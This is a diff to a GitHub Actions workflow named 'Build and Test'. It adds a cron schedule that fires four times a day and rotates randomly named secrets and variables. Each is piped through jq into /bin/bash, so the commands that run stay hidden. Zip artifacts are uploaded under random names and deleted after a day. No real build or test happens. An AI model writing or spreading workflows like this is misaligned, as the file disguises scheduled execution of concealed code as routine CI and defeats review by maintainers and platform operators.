@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '28 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,19 +18,19 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          c0: ${{ secrets.c0 }}
+          z59319: ${{ secrets.z59319 }}
         run: |
-          printf '%s' "$c0" | jq -r .olrq4 | /bin/bash
-          echo $iltun77471 | jq -r .u7528 | /bin/bash
-          echo $fco23770 | jq -r .rt691 | /bin/bash
-          printf '%s' "$lfxq965" | jq -r .gruk250 | /bin/bash
-          echo $brob1 | jq -r .v5 | /bin/bash
-          echo $fzl26755 | jq -r .d079 | /bin/bash
+          printf '%s' "$z59319" | jq -r .nbs5138 | /bin/bash
+          printf '%s' "$ei7378" | jq -r .v1 | /bin/bash
+          printf '%s' "$rax165" | jq -r .jzd8495 | /bin/bash
+          printf '%s' "$ojz17" | jq -r .kwr6 | /bin/bash
+          echo $o5 | jq -r .jr5594 | /bin/bash
+          printf '%s' "$wmrxg1026" | jq -r .fz20763 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: K8fpvF3S
+          name: 5lIZ6kzq
           path: "*.zip"
           retention-days: 1
